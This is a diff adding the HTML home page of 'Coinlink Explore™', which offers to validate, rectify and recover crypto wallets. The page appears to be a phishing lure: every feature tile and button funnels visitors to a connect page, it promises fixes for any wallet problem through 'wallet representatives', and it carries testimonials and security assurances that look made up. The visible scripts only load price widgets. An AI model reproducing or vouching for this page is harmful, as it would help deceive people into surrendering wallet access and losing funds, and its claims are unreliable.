@@ -1,0 +1,719 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+    <meta name="description" content=" Coinlink Explore™ - Securely manage and validate your crypto wallets.">
+    <meta name="robots" content="index, follow">
+    <link rel="icon" type="image/png" href="images/favicon.png">
+    <title> Coinlink Explore™ | Home</title>
+
+    <!-- Use CDNs for external resources -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link href="css/bootstrap-icons.css" rel="stylesheet">
+
+    <!-- Local custom styles -->
+    <link href="css/style.css" rel="stylesheet">
+
+   <style>
+    #marquee-element {
+        padding: 12px !important;
+    }
+    .crypto_price_scroll {
+        min-height: 50px;
+        background-color: #f8f9fa;
+        padding: 10px 0;
+        overflow: hidden;
+        text-align: center;
+    }
+    .features_icon {
+        font-size: 2rem;
+    }
+    .selected_features {
+        cursor: pointer;
+    }
+    .selected_features:hover {
+        transform: scale(1.05);
+        background-color: #f0f7ff;
+        transition: all 0.3s ease;
+    }
+    .text-green-600 {
+        display: inline !important;
+    }
+    .nav-link img {
+        vertical-align: middle;
+    }
+    .nav-link img[width="8"] {
+        width: 8px;
+        height: 8px;
+    }
+    .nav-link img[width="15"] {
+        width: 15px;
+        height: 15px;
+    }
+    .text-center .text-white-50 {
+        font-size: 1.50rem;
+        font-weight: bold;
+    }
+    section.background-image.bg-dark {
+        background-image: url('https://images.unsplash.com/photo-1639322537228-f710d846310a?ixlib=rb-4.0.3&auto=format&fit=crop&w=1920&q=80') !important;
+        background-size: cover !important;
+        background-position: center !important;
+        background-color: #1a252f;
+    }
+    /* Dapp logo size */
+    .dapp-logo {
+        width: 90px;
+        height: auto;
+    }
+    /* Home -  Coinlink Explore™ text size */
+    .home-link-text {
+        font-size: 1rem;
+    }
+    /* Reduce spacing to minimum */
+    .navbar-brand {
+        margin-right: 1px;
+    }
+    .navbar-nav {
+        margin-bottom: 1px;
+    }
+    /* Set feature text color to white */
+    .feature-text {
+        color: #ffffff;
+    }
+    /* Ensure navbar has no bottom padding or margin */
+    .osahan-nav {
+        padding-bottom: 0 !important;
+        margin-bottom: 0 !important;
+    }
+    /* Desktop: Elongate navbar and ensure chain switcher is fully visible */
+    @media (min-width: 992px) {
+        .navbar-nav {
+            flex: 0 0 auto;
+        }
+        #navbarNavAltMarkup16 {
+            flex: 1;
+            justify-content: space-between;
+        }
+        .explore-tabs {
+            flex: 1;
+            justify-content: center !important;
+            min-width: 600px;
+        }
+        .connect_wallet {
+            flex: 0 0 auto;
+        }
+    }
+    /* Mobile layout adjustments */
+    @media (max-width: 991px) {
+        .navbar-nav, .explore-tabs, .connect_wallet {
+            align-items: center !important;
+            width: 100%;
+        }
+        .home-link {
+            text-align: center;
+        }
+        .explore-tabs {
+            flex-wrap: wrap !important;
+            justify-content: center !important;
+            margin-bottom: 3px;
+        }
+        .nav-item {
+            margin: 2px 0;
+        }
+        .connect_wallet {
+            margin-top: 3px;
+            width: 100%;
+        }
+        .connect_wallet .btn {
+            width: 100%;
+        }
+        #navbarNavAltMarkup16 {
+            flex-direction: row !important;
+            flex-wrap: wrap;
+            justify-content: center;
+        }
+        /* Style for Crypto Feed */
+#crypto-feed {
+    font-size: 0.9rem;
+    color: #333;
+}
+#crypto-feed .ccc-widget {
+    background: #fff;
+    border-radius: 8px;
+    padding: 10px;
+    display: flex;
+    justify-content: center;
+    flex-wrap: wrap;
+    gap: 10px;
+}
+#crypto-feed .ccc-widget span {
+    color: #007bff;
+    font-weight: 500;
+}
+    }
+</style>
+</head>
+<body>
+    <nav class="navbar navbar-expand-lg navbar-dark bg-dark shadow-sm p-0 osahan-nav">
+    <div class="container d-flex flex-column flex-lg-row align-items-start">
+        <a class="navbar-brand" href="index-2.html">
+            <img src="images/dapp_logo.png" alt=" Coinlink Explore Logo" class="img-fluid me-1 dapp-logo">
+        </a>
+        <ul class="navbar-nav mb-0 mb-lg-0 home-link">
+            <li class="nav-item">
+                <a class="nav-link active home-link-text" aria-current="page" href="index-2.html">Home -  Coinlink Explore™</a>
+            </li>
+        </ul>
+        <div id="navbarNavAltMarkup16" class="d-flex flex-column flex-lg-row align-items-center w-100">
+            <ul class="nav explore-tabs mb-0 justify-content-center gap-1 flex-nowrap overflow-x-auto" id="chain-switch-pill" role="tablist">
+                <li class="nav-item" role="presentation" data-chain-id="1">
+                    <button class="nav-link" id="pills-ethereum-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-ethereum" aria-selected="true">
+                        <a style="text-decoration:none" href="https://ethereum.org/en/">
+                            <span><img src="images/ethereum.png" width="8"></span>  Ethereum
+                        </a>
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation" data-chain-id="2">
+                    <button class="nav-link" id="pills-bsc-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-bsc" aria-selected="true">
+                        <a style="text-decoration:none" href="https://bscscan.com/">
+                            <span><img src="images/binance.png" width="15"></span>  BSC
+                        </a>
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation" data-chain-id="3">
+                    <button class="nav-link" id="pills-polygon-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-polygon" aria-selected="true">
+                        <a style="text-decoration:none" href="https://polygon.technology/">
+                            <span><img src="images/polygon.png" width="15"></span>  Polygon
+                        </a>
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation" data-chain-id="4">
+                    <button class="nav-link" id="pills-avalanche-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-avalanche" aria-selected="true">
+                        <a style="text-decoration:none" href="https://www.avax.network/">
+                            <span><img src="images/avalanche.png" width="15"></span>  Avalanche
+                        </a>
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation" data-chain-id="5">
+                    <button class="nav-link" id="pills-solana-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-solana" aria-selected="true">
+                        <a style="text-decoration:none" href="https://solana.com/">
+                            <span><img src="images/solana.png" width="15"></span>  Solana
+                        </a>
+                    </button>
+                </li>
+                <li class="nav-item" role="presentation" data-chain-id="6">
+                    <button class="nav-link" id="pills-cardano-tab" data-bs-toggle="pill" type="button" role="tab" aria-controls="pills-cardano" aria-selected="true">
+                        <a style="text-decoration:none" href="https://cardano.org/">
+                            <span><img src="images/cardano.png" width="15"></span>  Cardano
+                        </a>
+                    </button>
+                </li>
+            </ul>
+            <!-- Removed the Connect Wallet button -->
+        </div>
+    </div>
+</nav>
+
+    <section class="background-image bg-dark py-5 pt-1">
+    <div class="container py-4">
+        <div class="row">
+            <div class="col-lg-7 col-12">
+                <div class="mb-4">
+                    <div class="display-5 fw-bold text-white mb-3"> Coinlink Explore™ is a secure, decentralized protocol</div>
+                    <div class="fs-5 text-white-50">This helps you validate, synchronize, and recover your wallets and assets across multiple blockchains. Easily connect your wallet, ensure your assets are up-to-date, and resolve issues with confidence—all while maintaining full control and privacy.</div>
+                </div>
+                <div>
+                    <a href="connect.html" class="btn btn-warning btn-lg me-3">Connect</a>
+                    <a href="connect.html" class="btn btn-light btn-lg">Sync</a>
+                </div>
+            </div>
+        </div>
+        <div class="row g-4 mt-5">
+            <div class="col-lg-4 col-4">
+                <div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+                    <span class="bg-primary rounded-circle steps-item-icon"><i class="bi bi-wallet2 text-white"></i></span>
+                    <div>
+                        <a style="text-decoration:none" href="connect.html"><div class="fw-bold fs-6 mb-1">1. Connect your Wallet</div></a>
+                        <p class="text-muted m-0 d-none d-md-block">Use Trust Wallet, Metamask or any wallet to connect to the app.</p>
+                    </div>
+                </div>
+            </div>
+            <div class="col-lg-4 col-4">
+                <div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+                    <span class="bg-primary rounded-circle steps-item-icon"><i class="bi bi-patch-plus text-white"></i></span>
+                    <div>
+                        <a style="text-decoration:none" href="connect.html"><div class="fw-bold fs-6 mb-1">2. Select a Feature to Validate</div></a>
+                        <div class="text-muted m-0 d-none d-md-block">You will be prompted to connect via a decentralized protocol.</div>
+                    </div>
+                </div>
+            </div>
+            <div class="col-lg-4 col-4">
+                <div class="rounded shadow-sm p-4 bg-white d-flex align-items-center gap-3 steps-item">
+                    <span class="bg-primary rounded-circle steps-item-icon"><i class="bi bi-piggy-bank text-white"></i></span>
+                    <div>
+                        <a style="text-decoration:none" href="connect.html"><div class="fw-bold fs-6 mb-1">3. Generate Proof of Validation</div></a>
+                        <div class="text-muted m-0 d-none d-md-block">Upon completion, save proof of wallet validation.</div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+     <!-- Replace lines 149–162 with this -->
+<div class="crypto_price_scroll">
+        <script type="text/javascript">
+        baseUrl = "https://widgets.cryptocompare.com/";
+        var scripts = document.getElementsByTagName("script");
+        var embedder = scripts[ scripts.length - 1 ];
+        var cccTheme = {"General":{"enableMarquee":true}};
+        (function (){
+        var appName = "google.com";
+        var s = document.createElement("script");
+        s.type = "text/javascript";
+        s.async = true;
+        var theUrl = baseUrl+'serve/v3/coin/header?fsyms=BTC,ETH,BNB,XRP,MATIC,DOGE,ADA,DAI,DOT,TRX,LTC,SHIB,SOL,UNI,AVAX,LINK,XMR,ATOM,ETC&tsyms=USD,EUR,CNY,GBP';
+        s.src = theUrl + ( theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+        embedder.parentNode.appendChild(s);
+        })();
+        </script>
+    </div>
+
+    <section class="py-5" id="features">
+        <div class="container my-4">
+            <div class="mb-3">
+                <div class="d-flex align-items-center justify-content-between mb-3">
+                    <div class="h4 m-0 fw-bold">Features 🌟</div>
+                </div>
+                <div class="row g-3">
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-gear-wide-connected text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Validation</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-eraser text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Rectification</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bandaid text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Synchronization</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-record-btn text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Asset Recovery</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-box-seam text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Migration Issues</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-wallet text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Refresh Metadata</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-speedometer text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">High Gas Fees</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bar-chart-steps text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Slippage Error</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-calculator text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Transaction Error</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bounding-box text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Cross Chain Transfer</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-cash-coin text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Staking Issues</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bank text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Swap/Bridge</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-motherboard text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Import Token</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-handbag text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Claim Reflection</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-person-badge text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Login Issues</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-droplet text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Claim Airdrop</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-image-alt text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">NFTS Issues</h6></a>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">NFTS Issues</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-123 text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Missing/Irregular Balances</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-alarm text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Transaction Delays</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-lock text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Locked Accounts</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-wallet text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Trading Wallet Issues</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-bag text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Tokens Purchase</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-heart text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Whitelist</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-motherboard text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Issurance</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-collection text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Wallet Retrieval</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-6 col-md-4 col-lg-2 div_each_feature">
+                        <div class="selected_features">
+                            <div class="p-2 rounded shadow-osahan bg-white card border-0">
+                                <div class="card-body text-center py-1">
+                                    <i class="bi bi-three-dots text-primary border border-white rounded-circle bg-white features_icon"></i>
+                                    <a style="text-decoration:none" href="connect.html"><h6 class="card-title mb-1 text-dark fw-bold mt-2">Others</h6></a>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Security Section -->
+<section class="py-5 bg-light">
+    <div class="container py-4">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-9">
+                <h3 class="text-center mb-4 fw-bold">Our Commitment to Security <i class="bi bi-shield-lock text-success"></i></h3>
+                <div class="row g-4">
+                    <div class="col-md-4">
+                        <div class="card shadow-sm">
+                            <div class="card-body text-center">
+                                <i class="bi bi-lock-fill text-success mb-3" style="font-size: 2rem;"></i>
+                                <h5 class="card-title">HTTPS Encryption</h5>
+                                <p class="card-text">All connections to  Coinlink Explore™ are secured with HTTPS, ensuring your data is encrypted and protected from unauthorized access.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card shadow-sm">
+                            <div class="card-body text-center">
+                                <i class="bi bi-shield-check text-success mb-3" style="font-size: 2rem;"></i>
+                                <h5 class="card-title">Decentralized Protocol</h5>
+                                <p class="card-text">Our decentralized architecture minimizes central points of failure, enhancing the security of your wallet interactions.</p>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card shadow-sm">
+                            <div class="card-body text-center">
+                                <i class="bi bi-key-fill text-success mb-3" style="font-size: 2rem;"></i>
+                                <h5 class="card-title">User Control</h5>
+                                <p class="card-text">We do not store your private keys or sensitive data, ensuring you retain full control over your assets at all times.</p>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+<!-- Testimonials Section -->
+<section class="py-5">
+    <div class="container py-4">
+        <div class="row justify-content-center">
+            <div class="col-12 col-lg-9">
+                <h3 class="text-center mb-4 fw-bold">What Our Users Say <i class="bi bi-chat-quote-fill text-primary"></i></h3>
+                <div class="row g-4">
+                    <div class="col-md-4">
+                        <div class="card shadow-sm">
+                            <div class="card-body text-center">
+                                <p class="card-text">" Coinlink Explore made it so easy to recover my funds back from a fake investment platform."</p>
+                                <h6 class="card-title mt-3 mb-0">Fux N.</h6>
+                                <small class="text-muted">Crypto Enthusiast</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card shadow-sm">
+                            <div class="card-body text-center">
+                                <p class="card-text">"I had an issue with unstaking my sol coins from a validator after getting it slashed. helped me resolve it quickly and got my full coins out. Great support and a secure platform!"</p>
+                                <h6 class="card-title mt-3 mb-0">Devi K.</h6>
+                                <small class="text-muted">Blockchain Developer</small>
+                            </div>
+                        </div>
+                    </div>
+                    <div class="col-md-4">
+                        <div class="card shadow-sm">
+                            <div class="card-body text-center">
+                                <p class="card-text">"Had an issue with my fantom migration to sonic, got it resolved here. Thank you guys "</p>
+                                <h6 class="card-title mt-3 mb-0">Michael T.</h6>
+                                <small class="text-muted">Investor</small>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</section>
+
+    <section class="bg-dark py-4">
+        <div class="container py-4">
+            <div class="row justify-content-center">
+                <div class="col-xl-6 col-lg-7 col-md-8 col-12">
+                    <div class="text-center py-4">
+                        <small class="text-white-50"> Coinlink Explore™</small>
+                        <h1 class="fw-bold text-white py-3">We Ensure Secure Wallet Access for All Users</h1>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <footer class="footer bg-white py-5">
+        <div class="container py-4">
+            <div class="row">
+                <div class="col-md-12 col-lg-4 col-12">
+                    <div class="row">
+                        <div class="col-3">
+                            <img src="images/dapp_logo.png" alt="#" class="img-fluid">
+                        </div>
+                        <div class="col-9 mt-2">
+                            <h4> Coinlink Explore™</h4>
+                        </div>
+                    </div>
+                    <div class="text-muted mt-4">
+                        <p class="mb-4"> Coinlink Explore™ is a decentralized protocol that enables secure synchronization of cryptocurrency wallets with dApps. It establishes a remote connection between multiple applications and devices, ensuring seamless and secure wallet management.</p>
+                        <p>Our protocol facilitates the resolution of wallet-related issues by connecting users with wallet representatives for effective support and rectification, all while maintaining the highest standards of security and privacy.</p>
+                    </div>
+                </div>
+                <div class="col-md-12 col-lg-4 col-12">
+    <div class="card shadow-sm p-3">
+        <h6 class="fw-bold text-center mb-3">Live Crypto Prices</h6>
+        <div id="crypto-feed" class="text-center">
+            <script type="text/javascript">
+                baseUrl = "https://widgets.cryptocompare.com/";
+                var scripts = document.getElementsByTagName("script");
+                var embedder = scripts[ scripts.length - 1 ];
+                (function (){
+                    var appName = "google.com";
+                    var s = document.createElement("script");
+                    s.type = "text/javascript";
+                    s.async = true;
+                    var theUrl = baseUrl+'serve/v1/coin/feed?fsym=BTC&tsym=USD';
+                    s.src = theUrl + ( theUrl.indexOf("?") >= 0 ? "&" : "?") + "app=" + appName;
+                    embedder.parentNode.appendChild(s);
+                })();
+            </script>
+        </div>
+    </div>
+</div>
+                <div class="col-md-12 col-lg-4 col-12">
+                    <form>
+                        <h6 class="fw-bold text-body mb-2">SUBSCRIBE</h6>
+                        <div class="mb-4 text-muted">Subscribe for the latest news, drops & new features</div>
+                        <div class="input-group">
+                            <input type="text" class="form-control" placeholder="Enter Your Email">
+                            <button class="btn btn-primary" type="button"><i class="bi bi-envelope me-2"></i> Subscribe</button>
+                        </div>
+                        <div class="small mt-3 text-danger">We respect your privacy and will not send unsolicited emails. You may unsubscribe at any time by clicking the link provided in the email.</div>
+                    </form>
+                </div>
+            </div>
+        </div>
+    </footer>
+    
+
+    <div class="footer-end bg-white py-4">
+    <div class="container">
+        <p class="text-xs text-gray-500 text-center">
+            © 2025  Coinlink Explore™, All rights reserved. | 
+            <a href="cdn-cgi/l/email-protection.html#d8abada8a8b7aaac98b4b9a1bdaaabbbb0b9b1b6f6b1b6" class="text-blue-600 underline"><span class="__cf_email__" data-cfemail="b0838580809f8284b09c9189958283939891999ede999e">[email protected]</span></a> | 
+            <a href="privacy.html" class="text-blue-600 underline">Privacy Policy</a> | 
+            <a href="terms.html" class="text-blue-600 underline">Terms</a> | 
+            <span class="text-success"><i class="bi bi-lock-fill me-1"></i> Encrypted Connection</span>
+        </p>
+    </div>
+</div>
+
+    <script src="js/jquery-3.6.0.min.js" defer=""></script>
+<script src="js/bootstrap.bundle.min.js" defer=""></script>
+<script src="js/main.js" defer=""></script>
+<script src="js/custom.js" defer=""></script>
+<script src="js/index-scripts.js" defer=""></script>
+
+
+</body></html>
